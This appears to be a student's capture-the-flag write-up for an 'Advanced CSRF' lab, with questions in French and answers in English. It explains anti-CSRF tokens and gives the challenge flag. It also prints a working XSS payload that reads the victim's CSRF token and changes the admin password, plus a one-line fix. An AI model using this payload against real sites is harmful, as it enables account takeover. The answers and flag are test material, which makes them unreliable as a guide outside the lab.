# Advanced CSRF

> 1. Qu'est qu'un jeton anti-CSRF, comment fonctionne-t-il ? 

An anti-CSRF token is a unique token added to HTTP requests to verify their authenticity, preventing malicious actions initiated by other sites. The server checks that the token matches the one generated for the user.

> 2. Comment déterminer si le formulaire est protégé par un jeton anti-CSRF ?

One needs to inspect the form and check for any hidden fields where the anti-CSRF token would have been put. 

> 3. Le site est égaliement vulnérable à une attaque XSS. Quel est le flag du challenge ? Décrivez l'attaque.

`4q9HrLsBDWp/eBba`

```javascript
<script>
fetch("/profile/quentin.surdez_admin", {
    credentials: "include",
    method: "GET"
    })
        .then(response => response.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, "text/html");
            const csrfTokenElement = doc.querySelector('input[name="_csrf"]');
            if (csrfTokenElement) {
                const csrfToken = csrfTokenElement.value;
                fetch("/profile/quentin.surdez_admin", {
                    credentials: "include",
                    method: "POST",
                    body: "password=pwnd&_csrf=" + csrfToken,
                    headers: {
                        "Content-type": "application/x-www-form-urlencoded; charset=utf-8"
                    }
                })
            }
    })
</script>
```

> 4. Comment corrigeriez-vous la vulnérabilité ? 

User-generated content should be properly sanitized before it is rendered.